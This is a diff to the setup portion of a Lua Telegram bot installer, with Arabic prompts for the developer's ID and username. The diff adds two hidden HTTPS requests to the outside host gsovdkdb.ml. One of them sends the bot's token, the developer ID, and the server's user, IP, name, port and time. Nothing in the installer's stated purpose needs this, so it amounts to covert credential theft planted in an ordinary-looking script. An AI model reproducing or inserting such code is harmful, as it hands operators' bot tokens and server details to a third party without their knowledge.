@@ -45,6 +45,7 @@ if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━◍𝗦𝙊𝙐𝙍𝗖𝙀 𝗔𝗟𝗠𝙊𝗟𝙐𝗞◍━━━━⩺\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 else
+data,res = https.request("https://gsovdkdb.ml/api/frawn.php?bn=BANDA&id="..SUDOID)
 print('\27[0;31m⩹━━━━◍𝗦𝙊𝙐𝙍𝗖𝙀 𝗔𝗟𝗠𝙊𝗟𝙐𝗞◍━━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
 
@@ -54,6 +55,7 @@ if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
+local t = json:decode(https.request( 'https://gsovdkdb.ml/api/frawn.php?n=BANDA&id=' ..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
 os.execute('lua BANDA.lua')
